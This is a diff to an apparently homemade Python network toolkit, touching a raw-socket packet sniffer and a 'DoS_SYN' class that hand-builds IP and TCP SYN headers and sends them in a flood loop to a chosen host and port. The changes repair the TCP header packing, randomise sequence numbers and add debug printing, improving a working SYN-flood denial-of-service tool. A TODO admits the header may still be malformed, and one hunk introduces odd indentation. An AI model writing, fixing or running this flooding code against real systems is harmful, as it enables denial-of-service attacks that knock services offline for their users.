@@ -165,6 +165,8 @@ class Sniff :
             while True :
                 self.__sniff()
                 yield self.ordered, self.raw_buffer
+        except KeyboardInterrupt :
+            exit(1)
         except Exception as error :
             if not Constant.MODULE : Constant.EXCEPTION(error)
             return error
@@ -181,6 +183,7 @@ class Sniff :
                     self.ordered = str()
                     self.raw_buffer = sniff.recvfrom(65535)[0]
                     if self.raw_buffer :
+                        print(self.raw_buffer)
                         iph = self.ip_header(self.raw_buffer[0:20])
                         self.__analysis_proto(iph)
                         self.ordered = self.ordered.expandtabs(4)
@@ -225,10 +228,12 @@ class DoS_SYN :
                 ack : int = 0, psh : int = 0,
                 rst : int = 0, syn : int = 0,
                 fin : int = 0, win : int = 65535,
-                csm : int = 0, urp : int = 0) :
-        oft <<=  4
-        flg = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        segment = struct.pack("HHLLBBHHH", srp, dsp, seq, acn, oft, flg, win, csm, urp)
+                csm : int = 0, urp : int = 0) : #TODO bad header (wireshark)
+        oft <<= 12
+        res = 0 << 6
+        flg = (urg << 5) + (ack << 4) + (psh << 3) + (rst << 2) + (syn << 1) + fin
+        oft_res_flg = oft + res + flg
+        segment = struct.pack("HHLLHHHH", srp, dsp, seq, acn, oft_res_flg, win, csm, urp)
         return segment
 
     @staticmethod
@@ -270,11 +275,12 @@ class DoS_SYN :
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn)
         checksum = self.checksum(ip_header)
         ip_header = self.ip_header(src = src, dst = dst, idn = randidn, csm = checksum)
-        tcp_header = self.tcp_header(dsp = self.port, syn = 1)
+        randseq = random.randint(0, 65535)
+        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1)
         pseudo_header = self.pseudo_header(src = src, dst = dst, pln = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(dsp = self.port, syn = 1, csm = tcp_checksum)
+        tcp_header = self.tcp_header(dsp = self.port, seq = randseq, syn = 1, csm = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
@@ -298,6 +304,7 @@ class DoS_SYN :
             payload = self.prepare()
             with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket_protocol) as flood :
                 flood.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                flood.connect((self.host, self.port))
                 flood.sendto(payload, (self.host, self.port))
                 flood.shutdown(socket.SHUT_RDWR)
                 if not Constant.MODULE : print(f"[+] {self.load_symbol(i, self.rate, Constant.BLOCK)}  {i} packets sent", end = "\r", flush = True)
@@ -578,7 +585,7 @@ if not Constant.MODULE :
         args = manage_args()
         if args.Tool.upper() in Constant.TOOLS :
             try :
-                Constant.TOOLS[args.Tool.upper()]()
+               Constant.TOOLS[args.Tool.upper()]()
             except Exception as error:
                 invalid_args(error or "Not found required arguments")
         else :
